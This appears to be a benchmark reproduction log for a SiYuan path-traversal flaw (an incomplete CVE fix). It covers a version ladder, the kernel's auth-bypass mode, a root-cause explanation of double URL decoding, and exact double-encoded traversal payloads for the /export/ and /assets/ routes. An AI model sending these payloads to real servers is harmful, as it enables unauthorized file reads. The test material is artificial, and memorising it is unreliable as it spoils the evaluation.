siyuan-double-url-encode-assets-traversal — reproduction log  (REAL-SERVER-HTTP rebuild)
========================================================================================
Product : SiYuan (github.com/siyuan-note/siyuan), Go kernel note-taking app. OPEN SOURCE.
Class   : path traversal / arbitrary-file-read via double-URL-encoded ../ (CWE-22),
          SIBLING-ROUTE residual.
Pair    : CVE-2026-41894 (fixed v3.6.5, /export/ route) -> CVE-2026-54066 (fixed v3.7.0,
          /assets/ route). Advisory GHSA-p4m3-mgmm-c664 "Incomplete fix of CVE-2026-41894".

RUN MODE : real-server-http. The REAL, UNMODIFIED SiYuan kernel is booted per version
           from the OFFICIAL image b3log/siyuan:<tag>; the traversal fires through an
           EXTERNAL HTTP GET against the running kernel's own /export/ and /assets/
           routes; the oracle observes the flag-file bytes in the real HTTP response.
           NO SiYuan source is compiled or copied into the case (no source-lift).

VERSION LADDER (official images; git tags v3.6.4/v3.6.5/v3.7.0 confirmed via git ls-remote)
  V0 = b3log/siyuan:v3.6.4  /export/ AND /assets/ both double-decode          (PRE CVE-2026-41894)
  V1 = b3log/siyuan:v3.6.5  CVE-2026-41894 fix: /export/ gains gulu.File.IsSubPath guard (CLOSED),
               sibling /assets/ GetAssetAbsPath url.PathUnescape fallback UNCHANGED  <- TARGET / incomplete
  V2 = b3log/siyuan:v3.7.0  CVE-2026-54066 fix: /assets/ GetAssetAbsPath fallback removed +
               IsSensitivePath added (CLOSED)                                        <- negative control

REAL KERNEL BOOT (headless, no Electron/UI)
  compose entrypoint wrapper (docker-compose.yml): plants the benign ${PCB_FLAG} at
  /siyuan/workspace/pcb_flag.txt + a normal asset at data/assets/logo.png, then
  `exec /opt/siyuan/entrypoint.sh --workspace=/siyuan/workspace [serve]`. The image's
  own entrypoint chowns the workspace and su-exec's the real kernel. Kernel HTTP server
  listens on 6806 (util.FixedPort in container), published to 38620/38621/38622.
  NOTE: v3.7.0's kernel switched to a cobra CLI, so its HTTP server requires the `serve`
  subcommand; v3.6.4/v3.6.5 start the server with no subcommand.

AUTH FLOW (real, unauthenticated-equivalent — the real kernel's own logic)
  env SIYUAN_ACCESS_AUTH_CODE_BYPASS=true (util.initEnvVars -> util.SiYuanAccessAuthCodeBypass).
  With no access-auth-code configured, the kernel's own model.CheckAuth grants
  RoleAdministrator to EVERY request (kernel/model/session.go CheckAuth, github issue 9709),
  and the same env satisfies the kernel's Docker-boot requirement for an access-auth-code
  (util.Boot). No app code is modified; this is the kernel's documented open/headless mode.
  Consequence: serveAssets sees IsAdminRoleContext==true and skips the publish-access check,
  so the real /assets/ handler serves the traversed file.

DECODE-LOGIC EVOLUTION (verified VERBATIM from real source at the three tags)
  ROOT CAUSE (all versions originally): Go net/http decodes URL.Path once, then a SECOND
  url.PathUnescape() decodes again, so %252e%252e -> %2e%2e -> ".." and filepath.Join
  escapes the base dir.
  /export/ (kernel/server/serve.go serveExport):
    V0 v3.6.4:  filepath.Join(exportBaseDir, decodedPath); only util.IsSensitivePath denylist
    V1 v3.6.5:  + if !gulu.File.IsSubPath(exportBaseDir, fullPath) { 401 }  # CVE-2026-41894 -> CLOSED
    V2 v3.7.0:  IsSubPath guard retained + hardened /export/temp/ branch
  /assets/ (kernel/model/assets.go GetAssetAbsPath + serve.go serveAssets):
    V0 v3.6.4:  url.PathUnescape fallback -> getAssetAbsPath(unescaped)   # double-decode
    V1 v3.6.5:  fallback BYTE-IDENTICAL to v3.6.4 -> STILL double-decodes  # incomplete
    V2 v3.7.0:  fallback REMOVED; serveAssets retry block removed + util.IsSensitivePath(p) added  # CVE-2026-54066 -> CLOSED
  (getAssetAbsPath byte-identical across all three tags; its gulu.File.IsSubPath(util.WorkspaceDir, p)
   guard confines the traversal to WITHIN the workspace -> flag planted inside workspace, outside assets.)

PAYLOADS (exact double-encoded paths; both climb two levels to <workspace>/pcb_flag.txt)
  original (/export/, original_poc.py):  /export/%252e%252e/%252e%252e/pcb_flag.txt
     exportBaseDir = /siyuan/workspace/temp/export ; ../../ -> /siyuan/workspace/pcb_flag.txt
  residual (/assets/, _heldout/bypass_poc.py):  /assets/%252e%252e/%252e%252e/pcb_flag.txt
     DataDir = /siyuan/workspace/data ; assets/../../ -> /siyuan/workspace/pcb_flag.txt
  Client uses curl --path-as-is so the %252e is NOT normalized before it reaches the kernel.

ORACLE — Variant A (flag_oracle.validate_case), sibling-route
  Both routes are READ verbs reaching the SAME planted flag file -> one flag channel.
  /siyuan/workspace/pcb_flag.txt is NOT caught by util.IsSensitivePath (/siyuan is not a
  denylisted prefix; denylist covers /opt /var /tmp /usr /etc ... but not /siyuan).

